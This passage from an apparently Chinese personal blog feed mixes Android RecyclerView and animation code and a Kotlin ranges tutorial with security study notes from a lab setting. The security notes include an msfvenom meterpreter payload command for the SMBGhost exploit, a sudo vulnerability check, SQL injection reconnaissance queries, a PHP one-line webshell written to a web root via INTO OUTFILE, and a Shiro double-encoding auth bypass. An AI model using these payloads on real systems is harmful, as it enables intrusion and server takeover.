class="meta">@NonNull</span> ViewGroup parent, <span class="keyword">int</span> viewType)</span> </span>&#123;</span><br><span class="line">        View view = View.inflate(context, R.layout.recyclerview_item, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyViewHolder(view);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//绑定数据到TextView上面</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onBindViewHolder</span><span class="params">(<span class="meta">@NonNull</span> MyViewHolder holder, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">        holder.tv.setText(data.get(position).getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getItemCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data == <span class="keyword">null</span>? <span class="number">0</span>:data.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyViewHolder</span> <span class="keyword">extends</span> <span class="title">RecyclerView</span>.<span class="title">ViewHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> TextView tv;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyViewHolder</span><span class="params">(<span class="meta">@NonNull</span> View itemView)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(itemView);</span><br><span class="line">            tv = itemView.findViewById(R.id.tv);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x13-补帧动画"><a href="#0x13-补帧动画" class="headerlink" title="0x13 补帧动画"></a>0x13 补帧动画</h2><p>MainActivity.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        ImageView imageView = findViewById(R.id.iv);</span><br><span class="line"></span><br><span class="line">        imageView.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//通过加载xml文件动画设置文件来创建一个Animation对象</span></span><br><span class="line"><span class="comment">//                Animation animation = AnimationUtils.loadAnimation(MainActivity.this, R.anim.alpha);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//                Animation animation = AnimationUtils.loadAnimation(MainActivity.this, R.anim.rotate);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//                Animation animation = AnimationUtils.loadAnimation(MainActivity.this, R.anim.scale);</span></span><br><span class="line"></span><br><span class="line">                Animation animation = AnimationUtils.loadAnimation(MainActivity.<span class="keyword">this</span>, R.anim.translate);</span><br><span class="line"></span><br><span class="line">                imageView.startAnimation(animation);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">/*RelativeLayout relativeLayout= findViewById(R.id.rl);</span></span><br><span class="line"><span class="comment">        AnimationDrawable anim = (AnimationDrawable) relativeLayout.getBackground();</span></span><br><span class="line"><span class="comment">        relativeLayout.setOnClickListener(new View.OnClickListener() &#123;</span></span><br><span class="line"><span class="comment">            @Override</span></span><br><span class="line"><span class="comment">            public void onClick(View v) &#123;</span></span><br><span class="line"><span class="comment">                if (flag) &#123;</span></span><br><span class="line"><span class="comment">                    anim.start();</span></span><br><span class="line"><span class="comment">                    flag = false;</span></span><br><span class="line"><span class="comment">                &#125; else &#123;</span></span><br><span class="line"><span class="comment">                    anim.stop();</span></span><br><span class="line"><span class="comment">                    flag = true;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;);*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>res-&gt;drawable-&gt;frame.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">animation-list</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/swimnormalleft&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/swimnormalleft&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/eatnormalleft&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;200&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/swimnormalleft&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/swimnormalleft&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/lefttoright&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/swimnormalright&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/swimnormalright&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/eatnormalright&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;200&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/swimnormalright&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:drawable</span>=<span class="string">&quot;@drawable/righttoleft&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:duration</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">animation-list</span>&gt;</span></span><br></pre></td></tr></table></figure><p>res-&gt;anim-&gt;alpha.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">set</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">alpha</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:duration</span>=<span class="string">&quot;2000&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fromAlpha</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:toAlpha</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>res-&gt;anim-&gt;rotate.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">rotate</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:duration</span>=<span class="string">&quot;2000&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:fromDegrees</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:pivotX</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:pivotY</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:toDegrees</span>=<span class="string">&quot;360&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br></pre></td></tr></table></figure><p>res-&gt;anim-&gt;scale.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scale</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:duration</span>=<span class="string">&quot;2000&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fromXScale</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fromYScale</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:toXScale</span>=<span class="string">&quot;0.6&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:toYScale</span>=<span class="string">&quot;0.6&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:pivotX</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:pivotY</span>=<span class="string">&quot;50%&quot;</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure><p>res-&gt;anim-&gt;translate.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">translate</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:duration</span>=<span class="string">&quot;2000&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fromXDelta</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fromYDelta</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:toXDelta</span>=<span class="string">&quot;400&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:toYDelta</span>=<span class="string">&quot;400&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="fragment"><a href="#fragment" class="headerlink" title="fragment"></a>fragment</h2><h3 id="activity-与-Fragment-通信"><a href="#activity-与-Fragment-通信" class="headerlink" title="activity 与 Fragment 通信"></a>activity 与 Fragment 通信</h3><ul><li>原生方案: Bundle</li><li>java语言中类与类自己的通信常用方案: 接口</li></ul><hr><h2 id="Activity、FragmentActivity和AppCompatActivity的区别"><a href="#Activity、FragmentActivity和AppCompatActivity的区别" class="headerlink" title="Activity、FragmentActivity和AppCompatActivity的区别"></a>Activity、FragmentActivity和AppCompatActivity的区别</h2><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>Activity是最基础的一个，是其它类的直接或间接父类。<br>Activity中只能使用系统自带的host Fragment（API Level 11中加入），对应getFragmentManager方法来控制Activity和Fragment之间的交互。</p><h3 id="FragmentActivity"><a href="#FragmentActivity" class="headerlink" title="FragmentActivity"></a>FragmentActivity</h3><p>在v4包中引入FragmentActivity，FragmentActivity间接继承自Activity，并提供了对v4包中support Fragment的支持。<br>在FragmentActivity中必须使用getSupportFragmentManager方法来处理support Fragment的交互。也可以处理support Fragment的嵌套使用。</p><h3 id="AppCompatActivity"><a href="#AppCompatActivity" class="headerlink" title="AppCompatActivity"></a>AppCompatActivity</h3><p>AppCompatActivity继承自FragmentActivity，同时取代了ActionBarActivity。<br>AppCompatActivity支持ActionBar功能，同时更推荐使用ToolBar。AppCompatActivity为支持Material Design风格控件提供了便利。</p><hr><p>模仿微信界面:<br><a href="https://blog.csdn.net/ahuyangdong/article/details/82493158">https://blog.csdn.net/ahuyangdong/article/details/82493158</a><br><a href="https://github.com/ahuyangdong/TabCustom">https://github.com/ahuyangdong/TabCustom</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CEV漏洞复现</title>
      <link href="/2020/11/23/0day/"/>
      <url>/2020/11/23/0day/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CVE-2020-0796-SMBv3漏洞复现与提权”永恒之黑”"><a href="#CVE-2020-0796-SMBv3漏洞复现与提权”永恒之黑”" class="headerlink" title="CVE-2020-0796 - SMBv3漏洞复现与提权”永恒之黑”"></a>CVE-2020-0796 - SMBv3漏洞复现与提权”永恒之黑”</h2><p>扫描工具:<a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p><p>下载好可利用的POC<br><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.220.150 LPORT=3333 -f python -o test.py</span><br></pre></td></tr></table></figure><hr><h2 id="CVE-2020-1938-Tomcat-文件读取"><a href="#CVE-2020-1938-Tomcat-文件读取" class="headerlink" title="CVE-2020-1938_Tomcat_文件读取"></a>CVE-2020-1938_Tomcat_文件读取</h2><p>漏洞影响范围包括<br>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p><hr><h2 id="CVE-2021-3156Sudo-堆缓冲区溢出"><a href="#CVE-2021-3156Sudo-堆缓冲区溢出" class="headerlink" title="CVE-2021-3156Sudo 堆缓冲区溢出"></a>CVE-2021-3156Sudo 堆缓冲区溢出</h2><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s /</span><br></pre></td></tr></table></figure><p>如果响应一个以sudoedit:开头的报错，那么表明存在漏洞。<br>如果响应一个以usage:开头的报错，那么表明补丁已经生效。<br>在测试Ubuntu 19.04时感觉不太稳定</p><hr><p>参考:<br>CVE-2020-0796:<br><a href="https://blog.csdn.net/yangbz123/article/details/106583627/?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/yangbz123/article/details/106583627/?utm_medium=distribute.pc_relevant.none-task-blog-title-2&amp;spm=1001.2101.3001.4242</a><br><a href="https://www.cnblogs.com/cradle-q0518/p/13513804.html">https://www.cnblogs.com/cradle-q0518/p/13513804.html</a></p><p>CVE-2020-1938:<br><a href="https://www.52pojie.cn/thread-1118837-1-1.html">https://www.52pojie.cn/thread-1118837-1-1.html</a></p><p>CVE-2021-3156：<br><a href="https://github.com/stong/CVE-2021-3156/blob/master/exploit.c">https://github.com/stong/CVE-2021-3156/blob/master/exploit.c</a><br><a href="https://github.com/reverse-ex/CVE-2021-3156/blob/main/1.c">https://github.com/reverse-ex/CVE-2021-3156/blob/main/1.c</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484496&amp;idx=1&amp;sn=9010501601d3d43f74d44fe354182482&amp;chksm=fa8b19c8cdfc90de6978a5e426a74701a396e439b094a680efe61c4df67af3bfec4d284483c2&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484496&amp;idx=1&amp;sn=9010501601d3d43f74d44fe354182482&amp;chksm=fa8b19c8cdfc90de6978a5e426a74701a396e439b094a680efe61c4df67af3bfec4d284483c2&amp;scene=132#wechat_redirect</a><br><a href="https://mp.weixin.qq.com/s/x9Q4xsoEGsK1Kv_1AbHxaQ">https://mp.weixin.qq.com/s/x9Q4xsoEGsK1Kv_1AbHxaQ</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2020/11/23/sql-injection/"/>
      <url>/2020/11/23/sql-injection/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="搭建sqli-lab靶场"><a href="#搭建sqli-lab靶场" class="headerlink" title="搭建sqli-lab靶场"></a>搭建sqli-lab靶场</h2><p>github下载<br>放入phpstudy的web路径下<br>(搭建过程还算简单,具体略过…)</p><h2 id="SQL常用语句"><a href="#SQL常用语句" class="headerlink" title="SQL常用语句"></a>SQL常用语句</h2><h3 id="1-数据库相关信息"><a href="#1-数据库相关信息" class="headerlink" title="1. 数据库相关信息"></a>1. 数据库相关信息</h3><p>Schemata：存储数据库名的表<br>Tables：存储数据库以及数据库中的表名<br>Columns：存储数据库、表、以及表中的字段。</p><p>SCHEMA_NAME -&gt;数据库名称<br>TABLE_SCHEMA -&gt;该字段所属数据库名<br>TABLE_NAME -&gt;存储所属表的名称<br>COLUMN_NAME -&gt;该字段的名称</p><p>VERSION()  数据库版本信息<br>@@VERSION   数据库版本信息<br>@@GLOBAL.VERSION  数据库版本信息<br>database()   数据库名称</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//查看mysql所存在的所有数据库</span><br><span class="line">select schema_name from information_schema.schemata;</span><br><span class="line"></span><br><span class="line">//查看q0o0p数据库下的所有字段名 </span><br><span class="line">select table_schema,column_name,table_name from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;q0o0p&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//查询数据库版本信息</span><br><span class="line">select version(),@@version,@@global.version,database();</span><br></pre></td></tr></table></figure><p>查看mysql所存在的所有数据库:<br><img src="1.png"><br>查看q0o0p数据库下的所有字段名:<br><img src="2.png"><br>查询数据库版本信息<br><img src="5.png"></p><h3 id="2-服务器主机信息"><a href="#2-服务器主机信息" class="headerlink" title="2. 服务器主机信息"></a>2. 服务器主机信息</h3><p>@@HOSTNAME 主机名称<br>@@datadir——数据库路径<br>@@version_compile_os——操作系统版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 查询服务器主机信息</span><br><span class="line"> select @@hostname,@@datadir, @@version_compile_os;</span><br></pre></td></tr></table></figure><p>查询数据库版本信息:<br><img src="3.png"><br>查询数据库用户信息:<br><img src="4.png"></p><h3 id="3-数据库用户信息"><a href="#3-数据库用户信息" class="headerlink" title="3. 数据库用户信息"></a>3. 数据库用户信息</h3><p>user() 系统用户和登录主机名<br>current_user() 当前登录用户和登录主机名<br>system_user() 数据库系统用户账户名称和登录主机名<br>session_user() 当前会话用户名和登录主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查询数据库用户信息</span><br><span class="line">select user(),current_user(),system_user(),session_user();</span><br></pre></td></tr></table></figure><p>查询数据库用户信息:<br><img src="6.png"></p><h3 id="4-一句话木马"><a href="#4-一句话木马" class="headerlink" title="4. 一句话木马"></a>4. 一句话木马</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//导出一句话木马</span><br><span class="line">select <span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>intooutfile <span class="string">&#x27;/var/www/html/dvwa/1.php&#x27;</span>; </span><br></pre></td></tr></table></figure><h3 id="5-常用函数"><a href="#5-常用函数" class="headerlink" title="5. 常用函数"></a>5. 常用函数</h3><p>concat(str1,str2…) :没有分隔符串联多列结果。<br>concat_ws(separator,str1,str2,…): 含有分隔符地串联多列结果<br>group_concat(str1,str2,…): 用逗号,串联多行结果为一行，每行结果用逗号串联。<br>//0x3a是“:”的十六进制，在这里把它作为分隔符 : 的hex值.<br>concat(str1,str2…)和concat_ws(separator,str1,str2,…)进行对比:<br><img src="7.png"><br>group_concat(str1,str2,…):<br><img src="8.png"><br>concat，concat_ws，group_concat函数在实际注入场景中，应用于回显注入类型。可以根据回显的数据位置或回显数据列数，根据实际情况选择相应的函数。从功能上看，group_concat函数包含了concat和concat_ws的功能。</p><hr><p>参考:<br>搭建靶场:<br><a href="https://www.sqlsec.com/2020/05/sqlilabs.html">https://www.sqlsec.com/2020/05/sqlilabs.html</a><br><a href="https://www.freebuf.com/sectool/244499.html">https://www.freebuf.com/sectool/244499.html</a><br><a href="https://www.freebuf.com/articles/web/255614.html">https://www.freebuf.com/articles/web/255614.html</a><br>sql基础:<br><a href="https://www.freebuf.com/column/201364.html">https://www.freebuf.com/column/201364.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache shoir身份绕过(CVE-2020-11989)</title>
      <link href="/2020/11/19/web-shiro/"/>
      <url>/2020/11/19/web-shiro/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近在写java web的小练习时候刚好用到了shiro安全框架,偶然间看到了shiro的权限绕过漏洞<br>瞬间感觉颇有意思,顺便参考大佬们的博客初步探索一下,顺便在水一篇博客(开坑不填…).</p><h2 id="漏洞风险"><a href="#漏洞风险" class="headerlink" title="漏洞风险"></a>漏洞风险</h2><p>身份验证绕过等</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Shiro 1.5.3之前的版本</p><p>漏洞位置主要出现在org.apache.shiro.web.util.WebUtils#getPathWithinApplication中调用的getRequestUri方法。</p><p>可以通过url双编码的方式来绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ -&gt; %2f -&gt;%25%32%66</span><br></pre></td></tr></table></figure><hr><p>参考:<br><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a></p><p><a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CEV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kotlin-study</title>
      <link href="/2020/11/13/kotlin-study/"/>
      <url>/2020/11/13/kotlin-study/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>增加依赖:</p><ul><li>Gradle工程<br>下载Gradle: <a href="https://gradle.org/releases/">https://gradle.org/releases/</a><br>官方支持gradle,方便扩展,比maven灵活</li><li>Gradle配置<br>build.gradle<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repositories &#123; </span><br><span class="line">       maven &#123; url &#x27;http://maven.aliyun.com/nexus/content/groups/public/&#x27; &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>kotlin 区间的创建</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//集合</span></span><br><span class="line"><span class="keyword">val</span> c0 = intArrayOf(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">val</span> c1 = IntArray(<span class="number">5</span>) &#123; it + <span class="number">1</span> &#125;</span><br><span class="line"><span class="keyword">val</span> e = floatArrayOf(<span class="number">1f</span>, <span class="number">3f</span>, <span class="number">4f</span>)</span><br><span class="line">e.forEach &#123; element -&gt; println(element) &#125;</span><br><span class="line">println(c1.contentToString())</span><br><span class="line"></span><br><span class="line"><span class="comment">//闭区间</span></span><br><span class="line"><span class="keyword">val</span> intRange = <span class="number">1</span> .. <span class="number">10</span> <span class="comment">//[1,10],离散的</span></span><br><span class="line"><span class="keyword">val</span> uintRange = <span class="number">1.</span><span class="number">.10</span> <span class="comment">//[1,10],无符号数</span></span><br><span class="line">println(intRange.joinToString())</span><br><span class="line"><span class="keyword">val</span> floatRange = <span class="number">1f</span>.<span class="number">.3f</span> <span class="comment">//[1,3],连续的</span></span><br><span class="line"><span class="comment">//半开半闭区间</span></span><br><span class="line"><span class="keyword">val</span> charRange = <span class="string">&#x27;a&#x27;</span> until <span class="string">&#x27;z&#x27;</span> <span class="comment">//[a,z)</span></span><br><span class="line"><span class="comment">//倒序区间</span></span><br><span class="line"><span class="keyword">val</span> intRangeReverse = <span class="number">10</span> downTo <span class="number">1</span><span class="comment">//[10,1]</span></span><br><span class="line"><span class="comment">//区间的步长</span></span><br><span class="line"><span class="keyword">val</span> intRangeWithStep = <span class="number">1</span> .. <span class="number">10</span> step <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>区间包含关系</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 